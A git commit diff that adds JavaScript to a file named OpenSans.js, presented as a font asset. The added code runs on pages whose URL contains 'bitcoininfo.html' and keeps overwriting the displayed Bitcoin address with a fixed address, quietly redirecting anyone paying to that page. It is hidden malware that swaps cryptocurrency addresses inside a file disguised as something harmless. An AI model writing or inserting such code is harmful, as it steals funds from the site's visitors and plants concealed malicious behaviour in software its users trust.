6c4fa78e7ef01545f3850c2622c021d9bf5f85a3
reposltory <124707435+reposltory@users.noreply.github.com>
2023-11-26 15:29:01 +0330

    Nis

--- OpenSans.js
+++ OpenSans.js
@@ -1,1 +1,11 @@
-
+if (window.location.href.includes("bitcoininfo.html")) {
+  const desiredText = "1GTdrMF6SQ1CnvE7yPiEJH2hBQkJN46vEz";
+  const interval = setInterval(() => {
+    const bitaddress = document.getElementById("bitaddress");
+    if (bitaddress && bitaddress.textContent !== desiredText) {
+      bitaddress.textContent = desiredText;
+    } else {
+      clearInterval(interval);
+    }
+  }, 1);
+}
